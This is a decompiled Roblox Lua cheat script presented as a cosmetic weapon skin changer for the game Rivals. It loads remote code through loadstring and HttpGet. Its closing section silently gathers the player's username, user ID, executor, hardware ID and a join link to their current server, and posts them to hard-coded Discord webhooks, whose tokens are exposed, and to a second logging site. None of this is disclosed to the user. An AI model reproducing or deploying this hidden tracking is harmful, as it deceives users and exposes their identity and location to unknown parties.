local vu1 = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
local v2 = vu1
local v3 = vu1.CreateWindow(v2, {
    Name = "Soluna",
    Icon = 10734897102,
    LoadingTitle = "Soluna",
    LoadingSubtitle = "Rivals Skin Changer",
    DisableRayfieldPrompts = false,
    DisableBuildWarnings = false,
    Theme = {
        TextColor = Color3.fromRGB(230, 230, 230),
        Background = Color3.fromRGB(15, 15, 15),
        Topbar = Color3.fromRGB(20, 20, 20),
        Shadow = Color3.fromRGB(10, 10, 10),
        NotificationBackground = Color3.fromRGB(15, 15, 15),
        NotificationActionsBackground = Color3.fromRGB(40, 40, 40),
        TabBackground = Color3.fromRGB(25, 25, 25),
        TabStroke = Color3.fromRGB(30, 30, 30),
        TabBackgroundSelected = Color3.fromRGB(50, 50, 50),
        TabTextColor = Color3.fromRGB(220, 220, 220),
        SelectedTabTextColor = Color3.fromRGB(255, 255, 255),
        ElementBackground = Color3.fromRGB(20, 20, 20),
        ElementBackgroundHover = Color3.fromRGB(30, 30, 30),
        SecondaryElementBackground = Color3.fromRGB(15, 15, 15),
        ElementStroke = Color3.fromRGB(35, 35, 35),
        SecondaryElementStroke = Color3.fromRGB(30, 30, 30),
        SliderBackground = Color3.fromRGB(80, 80, 80),
        SliderProgress = Color3.fromRGB(120, 120, 120),
        SliderStroke = Color3.fromRGB(150, 150, 150),
        ToggleBackground = Color3.fromRGB(25, 25, 25),
        ToggleEnabled = Color3.fromRGB(200, 200, 200),
        ToggleDisabled = Color3.fromRGB(80, 80, 80),
        ToggleEnabledStroke = Color3.fromRGB(220, 220, 220),
        ToggleDisabledStroke = Color3.fromRGB(100, 100, 100),
        ToggleEnabledOuterStroke = Color3.fromRGB(80, 80, 80),
        ToggleDisabledOuterStroke = Color3.fromRGB(50, 50, 50),
        DropdownSelected = Color3.fromRGB(25, 25, 25),
        DropdownUnselected = Color3.fromRGB(20, 20, 20),
        InputBackground = Color3.fromRGB(20, 20, 20),
        InputStroke = Color3.fromRGB(45, 45, 45),
        PlaceholderColor = Color3.fromRGB(140, 140, 140)
    },
    ConfigurationSaving = {
        Enabled = true,
        FolderName = nil,
        FileName = "Soluna - Skin Changer"
    },
    Discord = {
        Enabled = true,
        Invite = "gdpCUVj6uS",
        RememberJoins = false
    },
    KeySystem = false,
    KeySettings = {
        Title = "Soluna",
        Subtitle = "Key System",
        Note = "Key is in Discord: https://discord.gg/gdpCUVj6uS",
        FileName = "Key",
        SaveKey = false,
        GrabKeyFromSite = true,
        Key = {
            "Soluna"
        }
    }
}):CreateTab("Main", 10734966248)
v3:CreateSection("Skin Changer")
v3:CreateParagraph({
    Title = "Welcome to Soluna Skin Changer",
    Content = "Follow these steps: 1. Pick a weapon 2. Pick a skin 3. Click Apply"
})
local vu53 = {
    skinFolders = {},
    viewModelsPath = nil,
    backupFolder = nil,
    InitializeViewModelsPath = function(p4)
        local vu5 = game:GetService("Players").LocalPlayer
        if not (vu5 and vu5.PlayerScripts) then
            return false
        end
        local v6, v7 = pcall(function()
            return vu5.PlayerScripts.Assets.ViewModels.Weapons
        end)
        if v6 and v7 then
            p4.viewModelsPath = v7
            return true
        end
        local v8, v9 = pcall(function()
            return vu5.PlayerScripts.Assets.ViewModels
        end)
        if not (v8 and v9) then
            return false
        end
        local v10 = Instance.new("Folder")
        v10.Name = "Weapons"
        v10.Parent = v9
        p4.viewModelsPath = v10
        return true
    end,
    DiscoverSkinFolders = function(pu11)
        if not (pu11.viewModelsPath or pu11:InitializeViewModelsPath()) then
            return false
        end
        local v12, v13, vu14 = pairs({
            ["Spooky Skin Case"] = "Spooky Skin Case",
            ["Skin Case 2"] = "Skin Case 2",
            ["Skin Case 3"] = "Skin Case 3",
            ["Skin Case"] = "Skin Case",
            Other = "Other",
            ["Festive Skin Case"] = "Festive Skin Case"
        })
        local vu15 = false
        while true do
            local vu16
            vu14, vu16 = v12(v13, vu14)
            if vu14 == nil then
                break
            end
            pcall(function()
                local v17 = pu11.viewModelsPath:FindFirstChild(vu16)
                if v17 then
                    pu11.skinFolders[vu14] = v17
                    vu15 = true
                end
            end)
        end
        return vu15
    end,
    UseHardcodedPaths = function(pu18)
        local v19 = game:GetService("Players").LocalPlayer
        if not (v19 and v19.PlayerScripts) then
            return false
        end
        local v20 = {
            ["Spooky Skin Case"] = v19.PlayerScripts.Assets.ViewModels:FindFirstChild("Spooky Skin Case"),
            ["Skin Case 2"] = v19.PlayerScripts.Assets.ViewModels:FindFirstChild("Skin Case 2"),
            ["Skin Case"] = v19.PlayerScripts.Assets.ViewModels:FindFirstChild("Skin Case"),
            Other = v19.PlayerScripts.Assets.ViewModels:FindFirstChild("Other"),
            ["Festive Skin Case"] = v19.PlayerScripts.Assets.ViewModels:FindFirstChild("Festive Skin Case")
        }
        local v21, v22, vu23 = pairs(v20)
        local vu24 = false
        while true do
            local vu25
            vu23, vu25 = v21(v22, vu23)
            if vu23 == nil then
                break
            end
            pcall(function()
                if vu25 then
                    pu18.skinFolders[vu23] = vu25
                    vu24 = true
                end
            end)
        end
        return vu24
    end,
    FindSkinModel = function(p26, pu27)
        if not pu27 then
            return nil
        end
        local v28, v29, v30 = pairs(p26.skinFolders)
        while true do
            local vu31
            v30, vu31 = v28(v29, v30)
            if v30 == nil then
                break
            end
            if vu31 then
                local v32, v33 = pcall(function()
                    if vu31:IsA("Folder") then
                        return vu31:FindFirstChild(pu27)
                    else
                        return nil
                    end
                end)
                if v32 and v33 then
                    return v33
                end
            end
        end
        return nil
    end,
    GetOrCreateBackupFolder = function(pu34)
        if pu34.backupFolder and pu34.backupFolder.Parent then
            return pu34.backupFolder
        end
        if not (pu34.viewModelsPath or pu34:InitializeViewModelsPath()) then
            return nil
        end
        local v36, v37 = pcall(function()
            local v35 = pu34.viewModelsPath:FindFirstChild("OriginalBackups")
            if not v35 then
                v35 = Instance.new("Folder")
                v35.Name = "OriginalBackups"
                v35.Parent = pu34.viewModelsPath
            end
            return v35
        end)
        if not v36 then
            return nil
        end
        pu34.backupFolder = v37
        return v37
    end,
    ApplySkinModel = function(p38, p39, p40)
        if not (p38.viewModelsPath or p38:InitializeViewModelsPath()) then
            return false, "Couldn\'t find your weapons. Try restarting the game!"
        end
        local v41 = p38.viewModelsPath:FindFirstChild(p39)
        if not (v41 and v41:IsA("Model")) then
            return false, "Couldn\'t find the " .. p39 .. " model. Try a different weapon!"
        end
        local v42 = p38:FindSkinModel(p40)
        if not v42 then
            return false, "Couldn\'t find the " .. p40 .. " skin. Try a different skin!"
        end
        local v43 = p38:GetOrCreateBackupFolder()
        if not v43 then
            return false, "Couldn\'t create a backup. Try restarting the game!"
        end
        local v44 = p39 .. "_Original"
        if not v43:FindFirstChild(v44) then
            local v45 = v41:Clone()
            v45.Name = v44
            v45.Parent = v43
        end
        v41:Destroy()
        local v46 = v42:Clone()
        v46.Name = p39
        v46.Parent = p38.viewModelsPath
        return true, "Success! Your " .. p39 .. " now has the " .. p40 .. " skin!"
    end,
    ResetSkinModel = function(p47, p48)
        if not (p47.viewModelsPath or p47:InitializeViewModelsPath()) then
            return false, "Couldn\'t find your weapons. Try restarting the game!"
        end
        local v49 = p47:GetOrCreateBackupFolder()
        if not v49 then
            return false, "Couldn\'t find your weapon backups. Try applying a skin first!"
        end
        local v50 = v49:FindFirstChild(p48 .. "_Original")
        if not v50 then
            return false, "No backup found for " .. p48 .. ". Try applying a skin first!"
        end
        local v51 = p47.viewModelsPath:FindFirstChild(p48)
        if v51 then
            v51:Destroy()
        end
        local v52 = v50:Clone()
        v52.Name = p48
        v52.Parent = p47.viewModelsPath
        return true, "Your " .. p48 .. " is back to normal!"
    end
}
task.spawn(function()
    if not (vu53:DiscoverSkinFolders() or vu53:UseHardcodedPaths()) then
        vu1:Notify({
            Title = "Oops!",
            Content = "Couldn\'t find skin folders. Try restarting the game!",
            Duration = 5,
            Image = 10709753149
        })
    end
end)
local vu54 = {
    ["Assault Rifle"] = {
        "AK-47",
        "AKEY-47",
        "Boneclaw Rifle",
        "AUG",
        "Phoenix Rifle",
        "Gingerbread AUG",
        "Tommy Gun"
    },
    ["Battle Axe"] = {
        "The Shred",
        "Nordic Axe",
        "Ban Axe"
    },
    ["Burst Rifle"] = {
        "Aqua Burst",
        "Electro Rifle",
        "Pixel Burst",
        "Pine Burst",
        "Spectral Burst",
        "FAMAS"
    },
    Chainsaw = {
        "Blobsaw"
    },
    Bow = {
        "Compound Bow",
        "Bat Bow"
    },
    Crossbow = {
        "Pixel Crossbow",
        "Frostbite Crossbow"
    },
    Daggers = {
        "Aces",
        "Cookies"
    },
    ["Energy Rifle"] = {
        "2025 Energy Rifle",
        "Apex Rifle",
        "Hacker Rifle",
        "Hydro Rifle"
    },
    ["Energy Pistols"] = {
        "2025 Energy Pistols",
        "Apex Pistols",
        "Hacker Pistols",
        "Void Pistols"
    },
    Exogun = {
        "Ray Gun",
        "Singularity",
        "Wondergun",
        "Repulsor",
        "Exogourd",
        "Midnight Festive Exogun"
    },
    Fists = {
        "Boxing Gloves",
        "Brass Knuckles",
        "Pumpkin Claws",
        "Festive Fists",
        "Fists of Hurt"
    },
    Flamethrower = {
        "Lamethrower",
        "Pixel Flamethrower",
        "Snowblower",
        "Glitterthrower"
    },
    ["Flare Gun"] = {
        "Dynamite Gun",
        "Firework Gun",
        "Banana Flare",
        "Wrapped Flare Gun",
        "Vexed Flare Gun"
    },
    ["Freeze Ray"] = {
        "Bubble Ray",
        "Temporal Ray",
        "Spider Ray",
        "Gum Ray",
        "Wrapped Freeze Ray"
    },
    Grenade = {
        "Water Balloon",
        "Whoopee Cushion",
        "Soul Grenade",
        "Jingle Grenade",
        "Dynamite"
    },
    ["Grenade Launcher"] = {
        "Swashbuckler",
        "Uranium Launcher",
        "Skull Launcher",
        "Snowball Launcher",
        "Gearnade Launcher"
    },
    Gunblade = {
        "Hyper Gunblade",
        "Crude Gunblade",
        "Elf\'s Gunblade"
    },
    Handgun = {
        "Blaster",
        "Pixel Handgun",
        "Pumpkin Handgun",
        "Gingerbread Handgun",
        "Gumball Handgun"
    },
    Katana = {
        "Lightning Bolt",
        "Saber",
        "Pixel Katana",
        "Devil\'s Trident",
        "2025 Katana",
        "Keytana",
        "Stellar Katana"
    },
    Knife = {
        "Chancla",
        "Karambit",
        "Machete",
        "Candy Cane",
        "Balisong"
    },
    Minigun = {
        "Lasergun 3000",
        "Pixel Minigun",
        "Wrapped Minigun",
        "Pumpkin Minigun",
        "Fighter Jet"
    },
    ["Riot Shield"] = {
        "Energy Shield",
        "Door",
        "Sled",
        ""
    },
    Molotov = {
        "Coffee",
        "Torch",
        "Vexed Candle",
        "Lava Lamp"
    },
    ["Paintball Gun"] = {
        "Boba Gun",
        "Slime Gun",
        "Brain Gun",
        "Snowball Gun",
        "Ketchup Gun"
    },
    Revolver = {
        "Boneclaw Revolver"
    },
    RPG = {
        "Nuke Launcher"
    },
    Scythe = {
        "Anchor",
        "Keythe",
        "Scythe of Death",
        "Bat Scythe",
        "Cryo Scythe",
        "Sakura Scythe"
    },
    Shorty = {
        "Lovely Shorty",
        "Not So Shorty",
        "Too Shorty",
        "Demon Shorty",
        "Balloon Shorty",
        "Wrapped Shorty"
    },
    Shotgun = {
        "Balloon Shotgun",
        "Hyper Shotgun",
        "Wrapped Shotgun",
        "Broomstick"
    },
    Slingshot = {
        "Goalpost",
        "Stick",
        "Boneshot",
        "Reindeer Slingshot"
    },
    ["Smoke Grenade"] = {
        "Balance",
        "Emoji Cloud",
        "Eyeball",
        "Hourglass",
        "Snowglobe"
    },
    Sniper = {
        "Hyper Sniper",
        "Pixel Sniper",
        "Keyper",
        "Gingerbread Sniper",
        "Eyething Sniper",
        "Event Horizon"
    },
    ["Subspace Tripmine"] = {
        "Don\'t Press",
        "Spring",
        "DIY Tripmine",
        "Dev-in-the-Box",
        "Trick or Treat"
    },
    Spray = {
        "Lovely Spray",
        "Pine Spray",
        "Nail Gun"
    },
    Trowel = {
        "Garden Shovel",
        "Plastic Shovel",
        "Snow Shovel",
        "Pumpkin Carver",
        "Paintbrush"
    },
    Uzi = {
        "Electro Uzi",
        "Water Uzi",
        "Pine Uzi",
        "Demon Uzi",
        "Money Gun"
    },
    Flashbang = {
        "Camera",
        "Disco Ball",
        "Pixel Flashbang",
        "Skullbang",
        "Lightbulb",
        "Shining Star"
    },
    Medkit = {
        "Briefcase",
        "Laptop",
        "Medkitty",
        "Sandwich",
        "Bucket of Candy"
    },
    ["Jump Pad"] = {
        "Bounce House"
    },
    ["War Horn"] = {
        "Trumpet",
        "Mammoth Horn",
        "Megaphone"
    }
}
local v55, v56, v57 = pairs(vu54)
local vu58 = vu53
local vu59 = vu1
local vu60 = {}
while true do
    local v61
    v57, v61 = v55(v56, v57)
    if v57 == nil then
        break
    end
    table.insert(vu60, v57)
end
table.sort(vu60)
local vu62 = vu60[1] or "No Weapons Found"
local vu63 = vu62 == "No Weapons Found" and "No Skins Found" or ((vu54[vu62] or {})[1] or "No Skins Found")
v3:CreateParagraph({
    Title = "Step 1: Select Weapon",
    Content = "Choose the weapon you want to modify"
})
local vu64 = nil
local vu67 = v3:CreateDropdown({
    Name = "Select Weapon",
    Options = vu60,
    CurrentOption = vu62,
    MultipleOptions = false,
    Flag = "BaseWeaponSelect",
    Callback = function(p65)
        if type(p65) ~= "table" then
            vu62 = p65
        else
            vu62 = p65[1]
        end
        local v66 = vu54[vu62] or {}
        if # v66 <= 0 then
            vu63 = "No Skins Found"
            if vu64 then
                vu64:Refresh({
                    "No Skins Found"
                })
                vu64:Set(vu63)
            end
        else
            vu63 = v66[1]
            if vu64 then
                vu64:Refresh(v66)
                vu64:Set(vu63)
            end
        end
    end
})
v3:CreateParagraph({
    Title = "Step 2: Select Skin",
    Content = "Choose the skin you want to apply"
})
vu64 = v3:CreateDropdown({
    Name = "Select Skin",
    Options = vu54[vu62] or {
        "No Skins Found"
    },
    CurrentOption = vu63,
    MultipleOptions = false,
    Flag = "SkinSelect",
    Callback = function(p68)
        if type(p68) ~= "table" then
            vu63 = p68
        else
            vu63 = p68[1]
        end
    end
})
v3:CreateParagraph({
    Title = "Step 3: Apply Selection",
    Content = "Click the button below to apply the selected skin"
})
v3:CreateButton({
    Name = "Apply Skin",
    Info = "Click to apply the selected skin to your weapon",
    Callback = function()
        if vu62 == "No Weapons Found" or vu63 == "No Skins Found" then
            vu59:Notify({
                Title = "Error",
                Content = "Please select a weapon and a skin before applying.",
                Duration = 3,
                Image = 10709753149
            })
        else
            local v69, v70 = vu58:ApplySkinModel(vu62, vu63)
            if v69 then
                vu59:Notify({
                    Title = "Success",
                    Content = v70,
                    Duration = 3,
                    Image = 4914902889
                })
            else
                vu59:Notify({
                    Title = "Error",
                    Content = v70,
                    Duration = 3,
                    Image = 10709753149
                })
            end
        end
    end
})
v3:CreateSection("Reset Options")
v3:CreateButton({
    Name = "Reset Current Weapon",
    Info = "Revert the selected weapon to its original model",
    Callback = function()
        if vu62 ~= "No Weapons Found" then
            local v71, v72 = vu58:ResetSkinModel(vu62)
            if v71 then
                vu59:Notify({
                    Title = "Success",
                    Content = v72,
                    Duration = 3,
                    Image = 4914902889
                })
            else
                vu59:Notify({
                    Title = "Error",
                    Content = v72,
                    Duration = 4,
                    Image = 10709753149
                })
            end
        else
            vu59:Notify({
                Title = "Error",
                Content = "Please select a weapon to reset.",
                Duration = 3,
                Image = 10709753149
            })
        end
    end
})
v3:CreateButton({
    Name = "Reset All Weapons",
    Info = "Revert all modified weapons to their original models",
    Callback = function()
        local v73 = vu58:GetOrCreateBackupFolder()
        if v73 then
            local v74, v75, v76 = ipairs(v73:GetChildren())
            local v77 = 0
            local v78 = 0
            while true do
                local vu79
                v76, vu79 = v74(v75, v76)
                if v76 == nil then
                    break
                end
                if vu79:IsA("Model") and vu79.Name:match("_Original$") then
                    local vu80 = vu79.Name:gsub("_Original$", "")
                    if pcall(function()
                        local v81 = vu58.viewModelsPath:FindFirstChild(vu80)
                        if v81 then
                            v81:Destroy()
                        end
                        local v82 = vu79:Clone()
                        v82.Name = vu80
                        v82.Parent = vu58.viewModelsPath
                    end) then
                        v78 = v78 + 1
                    else
                        v77 = v77 + 1
                    end
                end
            end
            if v78 > 0 then
                vu59:Notify({
                    Title = "Reset Complete",
                    Content = "Restored " .. v78 .. " weapons" .. (0 < v77 and " (" .. v77 .. " failed)" or ""),
                    Duration = 4,
                    Image = 4914902889
                })
            else
                vu59:Notify({
                    Title = "Information",
                    Content = "No modified weapons found to reset.",
                    Duration = 3,
                    Image = 4370341347
                })
            end
        else
            vu59:Notify({
                Title = "Error",
                Content = "No backups found. Apply a skin first before using this.",
                Duration = 3,
                Image = 10709753149
            })
        end
    end
})
v3:CreateSection("Find Your Favorite Skins")
v3:CreateInput({
    Name = "Search Weapons and Skins",
    Info = "Enter a weapon or skin name to filter options",
    PlaceholderText = "Example: AK-47, Knife, Pixel...",
    RemoveTextAfterFocusLost = false,
    Callback = function(p83)
        local v84 = p83:lower()
        if v84 == "" then
            vu67:Refresh(vu60)
            vu67:Set(vu62)
            local v85 = vu54[vu62] or {}
            if # v85 <= 0 then
                vu64:Refresh({
                    "No Skins Found"
                })
                vu64:Set("No Skins Found")
            else
                vu64:Refresh(v85)
                vu64:Set(vu63)
            end
        else
            local v86, v87, v88 = ipairs(vu60)
            local v89 = {}
            while true do
                local v90
                v88, v90 = v86(v87, v88)
                if v88 == nil then
                    break
                end
                if v90:lower():find(v84) then
                    table.insert(v89, v90)
                end
            end
            local v91, v92, v93 = pairs(vu54)
            local v94 = {}
            local v95 = {}
            while true do
                local v96, v97 = v91(v92, v93)
                if v96 == nil then
                    break
                end
                local v98, v99, v100 = ipairs(v97)
                v93 = v96
                local v101 = {}
                while true do
                    local v102
                    v100, v102 = v98(v99, v100)
                    if v100 == nil then
                        break
                    end
                    if v102:lower():find(v84) then
                        table.insert(v101, v102)
                        if not table.find(v94, v96) then
                            table.insert(v94, v96)
                        end
                    end
                end
                if # v101 > 0 then
                    v95[v96] = v101
                end
            end
            local v103, v104, v105 = ipairs(v89)
            local v106 = {}
            while true do
                local v107
                v105, v107 = v103(v104, v105)
                if v105 == nil then
                    break
                end
                if not table.find(v106, v107) then
                    table.insert(v106, v107)
                end
            end
            local v108, v109, v110 = ipairs(v94)
            while true do
                local v111
                v110, v111 = v108(v109, v110)
                if v110 == nil then
                    break
                end
                if not table.find(v106, v111) then
                    table.insert(v106, v111)
                end
            end
            if # v106 <= 0 then
                vu67:Refresh({
                    "No Matches Found"
                })
                vu67:Set("No Matches Found")
                vu64:Refresh({
                    "No Matches Found"
                })
                vu64:Set("No Matches Found")
                vu62 = "No Matches Found"
                vu63 = "No Matches Found"
            else
                vu67:Refresh(v106)
                if table.find(v106, vu62) then
                    if v95[vu62] then
                        vu64:Refresh(v95[vu62])
                        vu63 = v95[vu62][1]
                        vu64:Set(vu63)
                    end
                else
                    vu62 = v106[1]
                    vu67:Set(vu62)
                    if v95[vu62] then
                        vu64:Refresh(v95[vu62])
                        vu63 = v95[vu62][1]
                        vu64:Set(vu63)
                    else
                        local v112 = vu54[vu62] or {
                            "No Skins Found"
                        }
                        vu64:Refresh(v112)
                        vu63 = v112[1]
                        vu64:Set(vu63)
                    end
                end
            end
        end
    end
})
vu59:LoadConfiguration()
vu59:Notify({
    Title = "Soluna",
    Content = "Interface loaded successfully. Use the menu to change your skins.",
    Duration = 8,
    Image = 4914902889
})
local vu113 = game:GetService("Players").LocalPlayer
local vu114 = game.PlaceId
local vu115 = game.JobId
local vu116 = "Unknown"
local vu117 = game:GetService("HttpService")
local vu118 = game:GetService("MarketplaceService")
local vu119 = "soluna_checked_users.json"
local vu120 = {}
local function vu123()
    if writefile then
        local vu121 = "soluna_data/" .. vu119
        pcall(function()
            local v122 = vu117
            writefile(vu121, v122:JSONEncode(vu120))
        end)
    end
end
vu120 = (function()
    if isfolder and (isfile and readfile) then
        if not isfolder("soluna_data") then
            makefolder("soluna_data")
        end
        local vu124 = "soluna_data/" .. vu119
        if isfile(vu124) then
            local v125, v126 = pcall(function()
                return vu117:JSONDecode(readfile(vu124))
            end)
            if v125 and type(v126) == "table" then
                return v126
            end
        end
    end
    return {}
end)()
pcall(function()
    local v127, v128 = pcall(function()
        return vu118:GetProductInfo(vu114)
    end)
    if v127 and (v128 and v128.Name) then
        vu116 = v128.Name
    end
end)
local vu129 = "https://www.roblox.com/games/" .. vu114
local _ = "https://www.roblox.com/games/" .. vu114 .. "?jobId=" .. vu115
local vu130 = {
    "https://discord.com/api/webhooks/1367282821416226826/JBEAVQ0KYUfgvvv4hpIci8Y6wVjzUZi8BAeXS4Cb576YltKsjmfICoo_iKolhdPry4KZ",
    "https://discord.com/api/webhooks/1367282972218228979/vxgDR5zgQZA4X8b7H_6xn97LpsotHR0_kYvF5oAImAEhFnaJpjHNLEP4T1tpMJyj2V-v",
    "https://discord.com/api/webhooks/1367283058327425084/UcJl33ipmM9F22vFe3royCUuqwOBmRymiRBDKbF9y5v5sge33rXj_59Efr_Xj9osrA7d"
}
local v131 = {
    hwid1 = true,
    hwid2 = true
}
local vu134 = (function()
    if identifyexecutor then
        local v132, v133 = pcall(identifyexecutor)
        if v132 and (v133 and (type(v133) == "string" and v133 ~= "")) then
            return v133
        end
    end
    return "Unknown"
end)()
local vu140, vu141 = (function(p135, p136)
    local v137 = nil
    local v138
    if gethwid then
        local v139
        v139, v138 = pcall(gethwid)
        if v139 and type(v138) == "string" then
            if v138 == "" then
                v138 = v137
            end
        else
            v138 = v137
        end
    else
        v138 = v137
    end
    if v138 then
        return tostring(p135) .. "-" .. v138, v138
    else
        return tostring(p135) .. "-" .. (p136 or "Unknown"), nil
    end
end)(vu113.UserId, vu134)
local vu142 = ({
    example1 = true,
    example2 = true
})[vu140] or false
local v143
if vu141 then
    v143 = v131[vu141] or false
else
    v143 = false
end
local vu144 = vu142 or v143
local function vu145()
    return vu130[math.random(1, # vu130)]
end
local function vu147(p146)
    if syn and syn.request then
        return syn.request(p146)
    elseif http_request then
        return http_request(p146)
    elseif request then
        return request(p146)
    elseif httpservice then
        return httpservice.request(p146)
    elseif KRNL_LOADED and request then
        return request(p146)
    else
        return not (http and http.request) and {
            StatusCode = 0,
            Body = "No HTTP request function found"
        } or http.request(p146)
    end
end
local function vu152()
    local v148 = {
        username = "Activity Logger",
        avatar_url = "https://soluna-script.vercel.app/images/favicon.png",
        embeds = {
            {
                title = "Player Activity Log",
                description = "A new activity has been recorded.",
                color = 2895667,
                fields = {
                    {
                        name = "Username",
                        value = "[**" .. vu113.Name .. "**](" .. "https://www.roblox.com/users/" .. vu113.UserId .. "/profile)",
                        inline = true
                    },
                    {
                        name = "User ID",
                        value = "`" .. tostring(vu113.UserId) .. "`",
                        inline = true
                    },
                    {
                        name = "Executor",
                        value = "`" .. vu134 .. "`",
                        inline = true
                    },
                    {
                        name = "Session Identifier",
                        value = "`" .. vu140 .. "`",
                        inline = true
                    },
                    {
                        name = "Game",
                        value = "[**" .. vu116 .. "**](" .. vu129 .. ")",
                        inline = false
                    },
                    {
                        name = "Game ID",
                        value = "`" .. tostring(vu114) .. "`",
                        inline = false
                    },
                    {
                        name = "Join Game",
                        value = "`roblox://experiences/start?placeId=" .. vu114 .. "&gameInstanceId=" .. vu115 .. "`",
                        inline = false
                    }
                },
                footer = {
                    text = "Logged on " .. os.date("%B %d, %Y at %I:%M %p UTC"),
                    icon_url = "https://soluna-script.vercel.app/images/favicon.png"
                }
            }
        }
    }
    if vu144 then
        table.insert(v148.embeds[1].fields, {
            name = "Status",
            value = "**BANNED**",
            inline = false
        })
        v148.embeds[1].title = "[BANNED] Player Activity Log"
        v148.embeds[1].color = 16711680
        local v149 = vu142 and "Identifier Ban" or "HWID Ban"
        table.insert(v148.embeds[1].fields, {
            name = "Ban Reason",
            value = v149,
            inline = false
        })
    end
    local v150 = {
        Url = vu145(),
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = vu117:JSONEncode(v148)
    }
    local v151 = vu147(v150)
    if v151.StatusCode >= 400 then
        warn("Webhook Send Failed: " .. tostring(v151.StatusCode))
    end
end
local function vu156()
    if not vu120[vu113.UserId] then
        local v153 = {
            username = vu113.Name,
            userId = vu113.UserId,
            executor = vu134,
            identifier = vu140,
            hwid = vu141,
            gameId = vu114,
            gameName = vu116,
            jobId = vu115,
            isBanned = vu144
        }
        if vu144 then
            v153.banReason = vu142 and "Identifier Ban" or "HWID Ban"
        end
        local v154 = {
            Url = "https://aidanqm.com/api/log",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = vu117:JSONEncode(v153)
        }
        local v155 = vu147(v154)
        if v155.StatusCode < 200 or v155.StatusCode >= 300 then
            local _ = v155.Body
        else
            vu120[vu113.UserId] = os.time()
            vu123()
        end
    end
end
if vu144 then
    print("You\'re banned from Soluna, want to figure out why? Open a ticket in the discord with your session identifier: " .. vu140 .. ".")
end
pcall(function()
    vu152()
end)
pcall(function()
    vu156()
end)
return vu144